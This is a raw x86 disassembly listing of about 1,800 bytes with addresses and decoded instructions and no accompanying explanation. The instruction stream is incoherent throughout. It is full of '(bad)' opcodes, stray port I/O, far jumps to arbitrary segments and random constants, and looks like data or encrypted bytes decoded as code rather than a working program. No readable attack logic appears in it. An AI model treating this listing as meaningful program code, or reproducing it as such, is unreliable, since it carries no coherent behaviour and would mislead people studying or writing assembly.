  417db9:	inc    edi
  417dba:	adc    ecx,ebx
  417dbc:	inc    esp
  417dbd:	into   
  417dbe:	ss push ecx
  417dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dc1:	mov    al,ds:0x7cb350af
  417dc6:	pop    ebp
  417dc7:	lock retf 0xb04
  417dcb:	lods   al,BYTE PTR ds:[esi]
  417dcc:	xchg   BYTE PTR [edi+0x73],ah
  417dcf:	jns    0x417df1
  417dd1:	shl    DWORD PTR [edi+eiz*4],cl
  417dd4:	jg     0x417df7
  417dd6:	or     DWORD PTR [edx+0x3c032e52],esi
  417ddc:	mov    ch,0x5
  417dde:	pop    eax
  417ddf:	jne    0x417d6f
  417de1:	arpl   WORD PTR [eax+0x388328dc],cx
  417de7:	out    0xba,al
  417de9:	and    dh,BYTE PTR [ebx-0x55]
  417dec:	xor    esp,DWORD PTR [ebx]
  417dee:	jle    0x417e69
  417df0:	fisub  WORD PTR [edi-0x34]
  417df3:	adc    al,0x7d
  417df5:	pop    eax
  417df6:	dec    edi
  417df7:	aaa    
  417df8:	js     0x417e28
  417dfa:	fwait
  417dfb:	or     BYTE PTR [edi-0x58],cl
  417dfe:	mov    edi,0x9a548fd3
  417e03:	ins    BYTE PTR es:[edi],dx
  417e04:	popf   
  417e05:	iret   
  417e06:	pop    ds
  417e07:	push   edi
  417e08:	fisubr DWORD PTR [ecx]
  417e0a:	mov    DWORD PTR [ebp+0x2],eax
  417e0d:	ret    0xcb68
  417e10:	pop    ebp
  417e11:	je     0x417e79
  417e13:	cmp    ebx,DWORD PTR [ebx+0x69]
  417e16:	ins    DWORD PTR es:[edi],dx
  417e17:	scas   eax,DWORD PTR es:[edi]
  417e18:	sbb    al,0x30
  417e1a:	dec    eax
  417e1b:	xchg   DWORD PTR [eax],ebp
  417e1d:	adc    al,0x2e
  417e1f:	pop    edi
  417e20:	lar    esi,WORD PTR [edx]
  417e23:	cmp    eax,0x6007e0bf
  417e28:	sub    BYTE PTR [edi],dh
  417e2a:	icebp  
  417e2b:	inc    esi
  417e2c:	or     eax,0x3a8928f7
  417e31:	mov    dl,0x3f
  417e33:	in     eax,0x2a
  417e35:	sbb    DWORD PTR [ecx+0x35],0xc723da65
  417e3c:	(bad)  [ebx+0x13]
  417e3f:	mov    eax,0x68cd041
  417e44:	xor    eax,0x4a2aa570
  417e49:	loop   0x417e9c
  417e4b:	stos   BYTE PTR es:[edi],al
  417e4c:	(bad)  
  417e4d:	jg     0x417eb6
  417e4f:	aas    
  417e50:	pop    edi
  417e51:	jnp    0x417ecf
  417e53:	mov    bl,ah
  417e55:	xor    eax,0x57d52fa3
  417e5a:	ins    DWORD PTR es:[edi],dx
  417e5b:	adc    BYTE PTR [edx-0x357e6d56],dl
  417e61:	mov    ebx,0x381ab8a1
  417e66:	xchg   edi,eax
  417e67:	and    BYTE PTR [edi-0x809296f],bh
  417e6d:	mov    ecx,0xb513478d
  417e72:	(bad)  
  417e73:	call   0x33f9ee91
  417e78:	dec    esi
  417e79:	lahf   
  417e7a:	iret   
  417e7b:	aaa    
  417e7c:	test   eax,0x7df4f651
  417e81:	or     ch,BYTE PTR [edi-0x2e]
  417e84:	xor    al,0xb5
  417e86:	adc    eax,0xb17129a7
  417e8b:	js     0x417e6e
  417e8d:	jmp    0xa7ce:0xa99d7cd2
  417e94:	mov    bl,0xb7
  417e96:	ins    DWORD PTR es:[edi],dx
  417e97:	add    eax,0xd3cacc32
  417e9c:	xlat   BYTE PTR ds:[ebx]
  417e9d:	cmp    BYTE PTR [edi],dh
  417e9f:	mov    ebp,0xfd3ce553
  417ea4:	pop    ebx
  417ea5:	or     BYTE PTR [ebx+0x2bc0afe7],dl
  417eab:	dec    ebx
  417eac:	inc    esp
  417ead:	lods   al,BYTE PTR ds:[esi]
  417eae:	es push 0xbb09eeea
  417eb4:	gs aas 
  417eb6:	arpl   WORD PTR ds:0x249578ff,bp
  417ebc:	jb     0x417e3f
  417ebe:	popa   
  417ebf:	out    0x85,al
  417ec1:	xor    dh,dl
  417ec3:	jne    0x417e72
  417ec5:	jmp    DWORD PTR [ebx+0x7d]
  417ec8:	(bad)  
  417ec9:	idiv   cl
  417ecb:	mov    esi,0x9f3acc2c
  417ed0:	retf   0x68a6
  417ed3:	std    
  417ed4:	data16 mov al,ds:0x13b1fd27
  417eda:	inc    ebp
  417edb:	iret   
  417edc:	pop    es
  417edd:	(bad)  
  417ede:	push   edi
  417edf:	stos   DWORD PTR es:[edi],eax
  417ee0:	mov    edx,0x96eea279
  417ee5:	push   esi
  417ee6:	inc    esi
  417ee7:	push   ebx
  417ee8:	cmp    DWORD PTR [eax+0x730e00f5],ebp
  417eee:	mov    bh,0xca
  417ef0:	push   esi
  417ef1:	inc    BYTE PTR [esi+0x70f0fb6f]
  417ef7:	pop    ss
  417ef8:	and    ch,0xc0
  417efb:	pop    esi
  417efc:	add    eax,0xc663ca1e
  417f01:	xchg   ecx,eax
  417f02:	xchg   BYTE PTR [ecx+0x67],bl
  417f05:	in     al,0x54
  417f07:	sbb    eax,0xcf1aaa63
  417f0c:	and    ah,ah
  417f0e:	clc    
  417f0f:	fdiv   st,st(3)
  417f11:	push   esp
  417f12:	xor    al,dl
  417f14:	hlt    
  417f15:	inc    eax
  417f16:	or     esi,edx
  417f18:	sub    eax,0x1f4d2781
  417f1d:	ja     0x417f1c
  417f1f:	dec    edx
  417f20:	and    DWORD PTR [edi],edx
  417f22:	mov    dl,0x5f
  417f24:	mov    ah,bl
  417f26:	iret   
  417f27:	inc    ecx
  417f28:	inc    edi
  417f29:	stc    
  417f2a:	mov    DWORD PTR [esi],eax
  417f2c:	sub    eax,0xcf264555
  417f31:	fidivr WORD PTR [ecx]
  417f33:	shr    dh,1
  417f35:	add    ebp,DWORD PTR [edx-0x1763af84]
  417f3b:	out    0xa6,al
  417f3d:	jmp    0x417f9e
  417f3f:	les    ebp,FWORD PTR [ecx]
  417f41:	(bad)  
  417f42:	push   edx
  417f43:	pop    ecx
  417f44:	xor    ebx,DWORD PTR [ecx+0x6695e0d9]
  417f4a:	aas    
  417f4b:	test   eax,0xe266972
  417f50:	push   es
  417f51:	mov    ah,0xd2
  417f53:	dec    edi
  417f54:	sub    ch,BYTE PTR [ecx-0x5d]
  417f57:	fsub   st,st(1)
  417f59:	add    DWORD PTR [ecx+0x43],esi
  417f5c:	xchg   esi,eax
  417f5d:	cmp    edi,DWORD PTR [ebp+0x708f8af8]
  417f63:	mov    ecx,0x8c211f29
  417f68:	mov    al,ds:0x7a639a77
  417f6d:	popf   
  417f6e:	aas    
  417f6f:	push   ebp
  417f70:	loope  0x417f5c
  417f72:	or     edx,edx
  417f74:	cmp    DWORD PTR [eax+esi*2-0x24],edi
  417f78:	dec    eax
  417f79:	mov    ebp,0x9a229841
  417f7e:	loop   0x417f85
  417f80:	scas   al,BYTE PTR es:[edi]
  417f81:	push   0xdfc0e928
  417f86:	sub    cl,BYTE PTR [esi+0x4f193e6a]
  417f8c:	push   ebp
  417f8d:	pop    ds
  417f8e:	push   ecx
  417f8f:	pop    eax
  417f90:	or     DWORD PTR [esi-0x67],0x63528d8c
  417f97:	mov    dh,0x83
  417f99:	(bad)  
  417f9a:	repnz push 0xd01ecaac
  417fa0:	fcmovbe st,st(3)
  417fa2:	xor    esi,DWORD PTR [eax+0x39]
  417fa5:	add    ah,BYTE PTR [ebx]
  417fa7:	inc    ecx
  417fa8:	dec    ebx
  417fa9:	sbb    BYTE PTR [eax+0x73],cl
  417fac:	clc    
  417fad:	sbb    eax,0xa30889aa
  417fb2:	and    dh,BYTE PTR [eax+0x60]
  417fb5:	pop    DWORD PTR [esi]
  417fb7:	cmc    
  417fb8:	mov    bl,0xf8
  417fba:	sub    al,0xed
  417fbc:	and    edx,DWORD PTR [esi+0x30]
  417fbf:	fild   DWORD PTR [edx-0x3e88d7e5]
  417fc5:	out    dx,eax
  417fc6:	out    dx,eax
  417fc7:	test   edi,0xe749f471
  417fcd:	pop    esi
  417fce:	mov    ebp,0x15f91fe2
  417fd3:	jmp    0x97d29311
  417fd8:	(bad)
  417fdc:	jne    0x417fc4
  417fde:	cwde   
  417fdf:	inc    esi
  417fe0:	push   ebx
  417fe1:	xlat   BYTE PTR ds:[ebx]
  417fe2:	jmp    0x2718:0xec074457
  417fe9:	fwait
  417fea:	sub    eax,DWORD PTR [ecx+0x6d]
  417fed:	test   DWORD PTR [eax-0x11741ad1],ebp
  417ff3:	imul   BYTE PTR [ebp+0x79]
  417ff6:	in     al,dx
  417ff7:	jecxz  0x417f8b
  417ff9:	dec    ebp
  417ffa:	cmp    al,0x6e
  417ffc:	sub    DWORD PTR [ecx+0x79984e8f],ecx
  418002:	push   es
  418003:	push   ds
  418004:	lods   al,BYTE PTR ds:[esi]
  418005:	cmc    
  418006:	or     cl,BYTE PTR [ebp+0x488f04eb]
  41800c:	das    
  41800d:	ffreep st(3)
  41800f:	clc    
  418010:	push   edx
  418011:	push   edx
  418012:	test   dh,al
  418014:	pop    edx
  418015:	jnp    0x418003
  418017:	cmp    DWORD PTR [ebx-0x5c23da6c],0xffffff9d
  41801e:	in     eax,dx
  41801f:	outs   dx,BYTE PTR ds:[esi]
  418020:	xchg   BYTE PTR [ebp+0x587e0965],al
  418026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418027:	add    DWORD PTR [edi-0x2fe42009],ecx
  41802d:	lock mov dh,0x22
  418030:	rcr    DWORD PTR [esi+0x20],1
  418033:	aad    0xaa
  418035:	mov    ds:0xe79b2690,eax
  41803a:	nop
  41803b:	mov    bl,0x64
  41803d:	popa   
  41803e:	bound  ebx,QWORD PTR ds:[si+0x2]
  418043:	cmp    ebx,DWORD PTR [esp+edi*4-0x2a0ad877]
  41804a:	and    eax,0x15d6c0f
  41804f:	cdq    
  418050:	or     al,0x1
  418052:	mov    cl,0x97
  418054:	fnstsw WORD PTR [edx+0x280edfd]
  41805a:	addr16 mov ?,WORD PTR [bx+di]
  41805e:	sub    edx,DWORD PTR [edx+0x25005500]
  418064:	adc    al,0x85
  418066:	jb     0x418062
  418068:	adc    BYTE PTR [eax],ah
  41806a:	push   esp
  41806b:	push   ebx
  41806c:	ret    0xa312
  41806f:	stc    
  418070:	xchg   BYTE PTR [ecx-0x9ef4fd7],bl
  418076:	adc    ebx,ebx
  418078:	sub    eax,0xd0d029c8
  41807d:	mov    dl,0xaa
  41807f:	xchg   DWORD PTR [ecx],esp
  418081:	cwde   
  418082:	adc    BYTE PTR [edi-0x74f4f02a],dl
  418088:	push   esi
  418089:	mov    esp,DWORD PTR [eax-0x8e6fde0]
  41808f:	mov    DWORD PTR [esp+edx*8],esi
  418092:	xchg   ebp,eax
  418093:	jmp    0x4180c2
  418095:	(bad)  
  418096:	or     al,0x1c
  418098:	(bad)  
  418099:	sbb    bl,ah
  41809b:	fs (bad) 
  41809d:	or     al,0x54
  41809f:	lods   al,BYTE PTR ds:[esi]
  4180a0:	push   ss
  4180a1:	addr16 inc ebx
  4180a3:	xchg   esi,eax
  4180a4:	adc    DWORD PTR [edi],ecx
  4180a6:	ja     0x418074
  4180a8:	dec    ebp
  4180a9:	mov    ds:0x850e557f,al
  4180ae:	push   0xffffffab
  4180b0:	inc    ecx
  4180b1:	fst    DWORD PTR [ecx+edi*4]
  4180b4:	bound  edx,QWORD PTR [ecx+0x6fa5ef00]
  4180ba:	sub    al,0xfc
  4180bc:	clc    
  4180bd:	mov    al,ds:0xb0f45d6c
  4180c2:	inc    edx
  4180c3:	ror    dl,cl
  4180c5:	into   
  4180c6:	clc    
  4180c7:	int3   
  4180c8:	and    cl,ah
  4180ca:	call   0x1c76:0x329afecd
  4180d1:	clc    
  4180d2:	adc    bh,BYTE PTR [ecx+edi*4+0xefed34d]
  4180d9:	push   esp
  4180da:	leave  
  4180db:	(bad)  
  4180dd:	daa    
  4180de:	pop    ss
  4180df:	fmulp  st(4),st
  4180e1:	outs   dx,BYTE PTR ds:[esi]
  4180e2:	std    
  4180e3:	adc    al,0x71
  4180e5:	and    esi,0x9276d43f
  4180eb:	push   esi
  4180ec:	push   ds
  4180ed:	jecxz  0x4180c0
  4180ef:	cmp    BYTE PTR [edx-0x4],bl
  4180f2:	ret    0xc441
  4180f5:	or     esp,ebx
  4180f7:	or     edi,DWORD PTR [eax-0x2f2f7b46]
  4180fd:	jno    0x41810a
  4180ff:	fcomi  st,st(5)
  418101:	inc    esi
  418102:	rcr    BYTE PTR [ecx],cl
  418104:	seta   BYTE PTR ds:0x31bfe561
  41810c:	hlt    
  41810d:	cdq    
  41810e:	enter  0x1b5c,0x8b
  418112:	enter  0x5d67,0x9a
  418116:	pop    ebp
  418117:	test   ebx,edi
  418119:	sub    BYTE PTR [eax+0x53b7aad0],dh
  41811f:	xchg   ebp,eax
  418120:	pop    ebp
  418121:	lea    edx,[ecx-0x18]
  418124:	pmaxsw mm6,QWORD PTR [edi-0x49]
  418128:	xor    al,0xa4
  41812a:	mov    edi,0xeadfb161
  41812f:	sti    
  418130:	stos   BYTE PTR es:[edi],al
  418131:	int    0xd0
  418133:	cmp    DWORD PTR [ebp-0x379fb904],ebp
  418139:	scas   eax,DWORD PTR es:[edi]
  41813a:	gs sbb al,0x42
  41813d:	rcr    BYTE PTR [eax+0x7b1cd501],1
  418143:	daa    
  418144:	imul   edi,DWORD PTR [ecx],0x7b
  418147:	ins    DWORD PTR es:[edi],dx
  418148:	gs out dx,eax
  41814a:	sti    
  41814b:	dec    edi
  41814c:	in     eax,0x14
  41814e:	push   0x5f010989
  418153:	stos   BYTE PTR es:[edi],al
  418154:	mov    edi,0x4221265
  418159:	mov    ds:0x53d5fd41,eax
  41815e:	inc    esi
  41815f:	ret    0xe072
  418162:	cli    
  418163:	(bad)  
  418164:	mov    bl,0xe9
  418166:	xor    eax,0xb8b55452
  41816b:	sub    BYTE PTR ds:0xde997b1,0x59
  418172:	mov    ebp,0x279b27ae
  418177:	jno    0x418120
  418179:	jmp    0x41811e
  41817b:	jg     0x4181c9
  41817d:	int3   
  41817e:	les    ebp,FWORD PTR [edx-0x13fb53ee]
  418184:	enter  0x3ec,0xcd
  418188:	jo     0x418199
  41818a:	dec    esi
  41818b:	xlat   BYTE PTR ds:[ebx]
  41818c:	push   ebp
  41818d:	js     0x4181f1
  41818f:	push   esi
  418190:	push   cs
  418191:	cmp    al,BYTE PTR [ecx-0x1]
  418194:	rcr    BYTE PTR [edi-0x16],1
  418197:	ins    BYTE PTR es:[edi],dx
  418198:	dec    ecx
  418199:	bound  edi,QWORD PTR [eax-0x6105f06d]
  41819f:	and    eax,0x5a335877
  4181a4:	sub    dl,BYTE PTR [eax]
  4181a6:	pop    ecx
  4181a7:	sub    DWORD PTR [edx],esp
  4181a9:	lods   al,BYTE PTR ds:[esi]
  4181aa:	repnz mov bh,0x6f
  4181ad:	mov    ebx,DWORD PTR [edi]
  4181af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b0:	daa    
  4181b1:	adc    al,0x9
  4181b3:	push   eax
  4181b4:	pop    edi
  4181b5:	repnz xchg ebx,eax
  4181b7:	data16 fnclex 
  4181ba:	and    eax,0x30fac7e4
  4181bf:	mov    ch,0x9e
  4181c1:	adc    DWORD PTR [ecx+0x10c1ad89],ebp
  4181c7:	fwait
  4181c8:	mov    ebx,0xcc7d8757
  4181cd:	bound  eax,QWORD PTR [eax+0x500bcca8]
  4181d3:	enter  0x6d0,0x9d
  4181d7:	imul   edi,DWORD PTR [ebp-0x295029f1],0xe
  4181de:	mov    ds:0x3e3dd0e,eax
  4181e3:	leave  
  4181e4:	lahf   
  4181e5:	std    
  4181e6:	arpl   WORD PTR [eax+0x3fb1669f],di
  4181ec:	fmul   st,st(3)
  4181ee:	or     bh,al
  4181f0:	adc    DWORD PTR [ebp+ebx*8+0x62046c25],0xf3d0ff59
  4181fb:	out    dx,eax
  4181fc:	aam    0x2a
  4181fe:	or     DWORD PTR [ecx],edx
  418200:	mov    bh,BYTE PTR [edi+eax*8-0xf]
  418204:	inc    esp
  418205:	loopne 0x418215
  418207:	add    eax,DWORD PTR [edi+0x4908fe74]
  41820d:	inc    al
  41820f:	mov    ds:0xdace64f5,eax
  418214:	ds clc 
  418216:	pop    esi
  418217:	adc    BYTE PTR [ebp+eiz*8+0x5833a012],dh
  41821e:	lods   al,BYTE PTR ds:[esi]
  41821f:	test   BYTE PTR [ebp+0x50c33880],ch
  418225:	jp     0x418275
  418227:	and    al,0xa3
  418229:	pop    ss
  41822a:	ret    0x88f6
  41822d:	inc    eax
  41822e:	gs stos DWORD PTR es:[edi],eax
  418230:	cmp    DWORD PTR [eax],0x22
  418233:	bound  ebp,QWORD PTR [esi-0x7a1c091e]
  418239:	clc    
  41823a:	mov    bl,0xeb
  41823c:	or     eax,0x7cb30d55
  418241:	fst    QWORD PTR [eax+0x63]
  418244:	pop    edi
  418245:	int    0xd3
  418247:	push   cs
  418248:	xchg   BYTE PTR [edi+0x7bffa3b0],ah
  41824e:	cdq    
  41824f:	mov    esp,0x1e4b0466
  418254:	pop    esp
  418255:	out    dx,eax
  418256:	or     eax,0x3e696b9e
  41825b:	scas   eax,DWORD PTR es:[edi]
  41825c:	xor    ecx,edi
  41825e:	(bad)  
  41825f:	mov    ebx,0x8f99517
  418264:	mov    eax,ds:0xcd7597f2
  418269:	adc    edx,esi
  41826b:	ja     0x418285
  41826d:	(bad)  
  41826e:	pushf  
  41826f:	sbb    al,0xa6
  418271:	bsr    edi,DWORD PTR [esi-0x36]
  418275:	scas   eax,DWORD PTR es:[edi]
  418276:	aad    0xc3
  418278:	mov    BYTE PTR [ecx],ch
  41827a:	and    eax,0x5b6092ec
  41827f:	mov    ds:0xa7670c05,al
  418284:	xor    ecx,DWORD PTR [ebx]
  418286:	add    BYTE PTR [eax-0x43],0xe4
  41828a:	sub    DWORD PTR [esi-0x63],ecx
  41828d:	test   edi,edi
  41828f:	jne    0x4182b5
  418291:	mov    dh,0x37
  418293:	jno    0x4182ce
  418295:	fld    DWORD PTR [eax-0x55006652]
  41829b:	inc    ebp
  41829c:	sbb    al,dh
  41829e:	pcmpgtd mm4,QWORD PTR [ebx-0x73]
  4182a2:	aam    0x5
  4182a4:	xor    eax,0x30f1c901
  4182a9:	pushf  
  4182aa:	pusha  
  4182ab:	sub    eax,0xffffffdd
  4182ae:	pop    eax
  4182af:	push   eax
  4182b0:	sbb    eax,0xe018b71b
  4182b5:	dec    esi
  4182b6:	sub    edi,DWORD PTR [eax]
  4182b8:	and    eax,DWORD PTR [edx+ebx*4]
  4182bb:	xchg   ebx,eax
  4182bc:	pop    eax
  4182bd:	or     ch,dl
  4182bf:	shl    cl,0xc6
  4182c2:	mov    cl,0xd3
  4182c4:	lds    esi,FWORD PTR [edx]
  4182c6:	jl     0x418347
  4182c8:	mov    cl,0xd7
  4182ca:	imul   ebp,ebx,0xd647ec6f
  4182d0:	sbb    DWORD PTR fs:[edi-0x7a],edi
  4182d4:	push   0xffffffb7
  4182d6:	fmulp  st(6),st
  4182d8:	and    eax,DWORD PTR [esi-0x72d8e103]
  4182de:	mov    eax,ds:0x960df549
  4182e3:	fld    QWORD PTR [esi]
  4182e5:	retf   0x5118
  4182e8:	xor    eax,0xc3f1c03f
  4182ed:	mov    ebp,DWORD PTR [ecx]
  4182ef:	mov    dl,0x2c
  4182f1:	and    DWORD PTR [eax],edx
  4182f3:	and    bl,BYTE PTR [ebx+0x7f8b0141]
  4182f9:	dec    ebx
  4182fa:	jmp    0x4182d2
  4182fc:	scas   eax,DWORD PTR es:[edi]
  4182fd:	mov    edx,0x6d922031
  418302:	sub    al,0x77
  418304:	dec    edx
  418305:	jo     0x4182fa
  418307:	sbb    esi,edi
  418309:	in     al,0xa5
  41830b:	push   ecx
  41830c:	mov    cl,BYTE PTR [ebp+ecx*2+0x18dd9a56]
  418313:	and    DWORD PTR gs:[ebx],0x2fb5becc
  41831a:	xor    DWORD PTR [eax+0x5c],0x37
  41831e:	or     DWORD PTR [eax+0x576ee8b8],edi
  418324:	mov    esi,0x823b26f2
  418329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41832a:	adc    BYTE PTR [edi],bh
  41832c:	inc    esp
  41832d:	pop    edi
  41832e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832f:	imul   ecx
  418331:	mov    BYTE PTR [edi-0x33],dl
  418334:	dec    esi
  418335:	repnz call 0xbde4:0x816e0115
  41833d:	jl     0x41835a
  41833f:	mov    al,ds:0x3a071e69
  418344:	fmul   QWORD PTR ss:[ebp+0x73]
  418348:	in     al,dx
  418349:	lock out dx,eax
  41834b:	jmp    0x9b62:0x7fdadad3
  418352:	mov    eax,ds:0x8be7fc94
  418357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418359:	je     0x4182ec
  41835b:	lods   eax,DWORD PTR ds:[esi]
  41835c:	xor    ch,BYTE PTR [ecx]
  41835e:	sar    BYTE PTR [ecx],1
  418360:	lods   eax,DWORD PTR ds:[esi]
  418361:	push   ebp
  418362:	sahf   
  418363:	adc    al,0x99
  418365:	rcr    BYTE PTR gs:[eax-0x4e],1
  418369:	aas    
  41836a:	dec    esi
  41836b:	and    eax,0x4cf5d427
  418370:	mov    esp,0xc16e26ec
  418375:	les    ebx,FWORD PTR [ecx+0x60]
  418378:	ja     0x418399
  41837a:	cmp    BYTE PTR [ecx+0x7185572e],0xc0
  418381:	cmp    DWORD PTR [ebx+0x1d],eax
  418384:	aaa    
  418385:	mov    ds:0x42068507,al
  41838a:	push   esi
  41838b:	(bad)  
  41838c:	sbb    eax,0xab9a2234
  418391:	ds das 
  418393:	push   edx
  418394:	pusha  
  418395:	pusha  
  418396:	or     ecx,DWORD PTR ds:0x6844e943
  41839c:	mov    bh,0x18
  41839e:	fcmovne st,st(1)
  4183a0:	dec    eax
  4183a1:	clc    
  4183a2:	adc    eax,0x416fd1cb
  4183a7:	pop    eax
  4183a8:	pop    esi
  4183a9:	add    BYTE PTR [eax-0xc],cl
  4183ac:	jno    0x4183f7
  4183ae:	(bad)  
  4183af:	in     al,dx
  4183b0:	cmc    
  4183b1:	out    0xbb,al
  4183b3:	ins    DWORD PTR es:[edi],dx
  4183b4:	jp     0x418344
  4183b6:	xor    al,0x79
  4183b8:	xlat   BYTE PTR ds:[ebx]
  4183b9:	mov    edx,ds
  4183bb:	xchg   esi,eax
  4183bc:	neg    BYTE PTR [ecx]
  4183be:	ret    0xd4b2
  4183c1:	repnz pop ecx
  4183c3:	dec    eax
  4183c4:	push   edx
  4183c5:	fsubr  QWORD PTR [edx-0x40]
  4183c8:	je     0x4183bb
  4183ca:	dec    ebx
  4183cb:	jl     0x418370
  4183cd:	cmp    edi,0xffffffcc
  4183d0:	retf   
  4183d1:	rol    DWORD PTR [esi],0x54
  4183d4:	or     ebp,DWORD PTR [eax+0x6e]
  4183d7:	lods   eax,DWORD PTR ds:[esi]
  4183d8:	mov    bh,0x49
  4183da:	xor    eax,0xf1a20b63
  4183df:	std    
  4183e0:	mov    WORD PTR [ebx],?
  4183e2:	push   ecx
  4183e3:	and    ebp,DWORD PTR [edi]
  4183e5:	cmp    al,0x8b
  4183e7:	mov    edi,0x9b8c25e7
  4183ec:	mov    dh,0x79
  4183ee:	xchg   edi,eax
  4183ef:	jl     0x41841b
  4183f1:	mov    WORD PTR [ecx-0x3ec7b253],fs
  4183f7:	mov    edi,0x26c13769
  4183fc:	(bad)
  4183ff:	inc    edx
  418400:	pop    esi
  418401:	out    dx,al
  418402:	cwde   
  418403:	test   al,0xc
  418405:	xchg   ebp,eax
  418406:	push   edx
  418407:	and    BYTE PTR ss:[esi],ah
  41840a:	scas   eax,DWORD PTR es:[edi]
  41840b:	out    0x77,al
  41840d:	or     esp,esi
  41840f:	sub    BYTE PTR [ecx],ah
  418411:	pop    ecx
  418412:	lahf   
  418413:	xor    bh,cl
  418415:	in     al,0xa3
  418417:	inc    ebp
  418418:	inc    edx
  418419:	mov    WORD PTR [ebx-0x193738a2],?
  41841f:	in     al,0x24
  418421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418422:	pop    edx
  418423:	sti    
  418424:	mov    ebp,0x694b5878
  418429:	test   BYTE PTR [edx],dh
  41842b:	stc    
  41842c:	fwait
  41842d:	dec    ebx
  41842e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842f:	outs   dx,DWORD PTR ds:[esi]
  418430:	pop    esi
  418431:	xor    DWORD PTR [esi],0xe089c66e
  418437:	ret    
  418438:	adc    DWORD PTR [ecx-0x6f],ebx
  41843b:	rol    BYTE PTR [ecx+0x7cbd4d97],0x78
  418442:	mov    DWORD PTR [ebx],edx
  418444:	mov    ?,esi
  418446:	lock cli 
  418448:	mov    eax,ds:0x9fe609ad
  41844d:	sti    
  41844e:	or     al,0x95
  418450:	sahf   
  418451:	cdq    
  418452:	xchg   esi,eax
  418453:	stos   BYTE PTR es:[edi],al
  418454:	pop    es
  418455:	sbb    ah,BYTE PTR [ecx+0x4a]
  418458:	dec    ebp
  418459:	mov    eax,0xc1d62c77
  41845e:	imul   edi,DWORD PTR [eax+edx*1-0x60ac21ba],0x47
  418466:	push   edx
  418467:	add    DWORD PTR [ecx+0x5222c4f5],esp
  41846d:	rol    BYTE PTR [esp+eax*2-0x3ed8c4ce],1
  418474:	dec    edi
  418475:	lds    eax,FWORD PTR [ebp-0x55]
  418478:	outs   dx,DWORD PTR ds:[esi]
  418479:	adc    BYTE PTR [esi-0x62],dh
  41847c:	xchg   ebx,eax
  41847d:	ins    BYTE PTR es:[edi],dx
  41847e:	or     esi,DWORD PTR [esi+0x1a]
  418481:	mov    ch,0x71
  418483:	pop    ebx
  418484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418485:	call   0x11a5:0x397d85bd
  41848c:	aam    0x49
  41848e:	push   es
  41848f:	sbb    bl,BYTE PTR [ecx]
  418491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418492:	pushf  
  418493:	mov    ch,0xfb
  418495:	push   ds
  418496:	mov    ah,0x3b
  418498:	mov    eax,ds:0xe64bbff5
  41849d:	jecxz  0x418434
  41849f:	jae    0x4184c1
  4184a1:	ins    DWORD PTR es:[edi],dx
  4184a2:	mov    ah,0x82
  4184a4:	mov    esi,0x49957f7b
  4184a9:	ins    BYTE PTR es:[edi],dx
  4184aa:	push   eax
  4184ab:	leave  
  4184ac:	retf   0xbbaa
  4184af:	leave  
  4184b0:	adc    DWORD PTR [esi+0x657ecf2a],esp
  4184b6:	aad    0xea
  4184b8:	xor    ebx,edx
  4184ba:	lea    eax,[edx-0x53de38f9]
  4184c0:	leave  
  4184c1:	sbb    esp,DWORD PTR [ebx-0x1e61bc33]
  4184c7:	push   edx
  4184c8:	inc    ebp
  4184c9:	jne    0x41847a
  4184cb:	and    DWORD PTR [ecx-0x16fd150f],ebp
  4184d1:	daa    
  4184d2:	loopne 0x41849d
  4184d4:	push   0x5
  4184d6:	cmp    ebp,esp
  4184d8:	push   ecx
  4184d9:	imul   esp,esi,0x3a
  4184dc:	or     BYTE PTR [eax+eiz*8],dh
  4184df:	pop    edx
  4184e0:	xor    DWORD PTR [ebx-0x65b1b158],edx
  4184e6:	dec    ebx
  4184e7:	inc    eax
  4184e8:	cmp    al,0x5a
  4184ea:	dec    edx
  4184eb:	jo     0x41852c
  4184ed:	inc    esp
  4184ee:	int3   
  4184ef:	into   
  4184f0:	nop
  4184f1:	add    edx,DWORD PTR [ebp-0x781d47e3]
  4184f7:	sub    cl,bl
  4184f9:	(bad)  
  4184fa:	cmp    dl,BYTE PTR [esi-0x4d]
  4184fd:	jae    0x4184d6
  4184ff:	popf   
  418500:	xchg   BYTE PTR [edi+0x4f],bh
  418503:	ss call 0xdf78afde
  418509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850a:	call   0xc052ecbc
  41850f:	xor    al,0xd6
  418511:	pusha  
  418512:	push   ecx
  418513:	aam    0xea
  418515:	sub    al,al
  418517:	add    ecx,DWORD PTR [ebp+0x4c]
  41851a:	popa   
  41851b:	into   
  41851c:	jbe    0x418520
  41851e:	or     eax,0x5c49d9b5
  418523:	mul    DWORD PTR [esi]
  418525:	add    dl,BYTE PTR ds:0x27d4ddc5
  41852b:	xor    al,0x73
  41852d:	xchg   DWORD PTR [edx-0x11],ebx
  418530:	cmp    bh,BYTE PTR [edx]
  418532:	rol    DWORD PTR [edi+0x6b7a0146],1
  418538:	sub    DWORD PTR [ecx+0x369410d9],edx
  41853e:	dec    ebx
  41853f:	test   eax,0xf464284f
  418544:	pop    esi
  418545:	xchg   esp,eax
  418546:	rep lods al,BYTE PTR ds:[esi]
  418548:	adc    esp,DWORD PTR [edx+0x4702d4a4]
  41854e:	jo     0x418507
  418550:	add    al,0x40
  418552:	jmp    0x41859a
  418554:	rol    BYTE PTR [esi+0x1970a383],cl
  41855a:	mov    al,ds:0x700fc509
  41855f:	mul    BYTE PTR [ecx+eiz*1-0x80]
  418563:	sub    al,0x2d
  418565:	(bad)  
  418567:	scas   eax,DWORD PTR es:[edi]
  418568:	mov    eax,ds:0x4996800b
  41856d:	push   cs
  41856e:	push   esi
  41856f:	xchg   esi,eax
  418570:	pushf  
  418571:	clc    
  418572:	fsubrp st(2),st
  418574:	inc    edi
  418575:	(bad)  
  418576:	out    dx,eax
  418577:	adc    bl,BYTE PTR ds:0x893096a7
  41857d:	jmp    0xd229513c
  418582:	mov    ds:0xd4a3f56a,al
  418587:	jle    0x418538
  418589:	jg     0x41851a
  41858b:	fadd   st,st(3)
  41858d:	push   edx
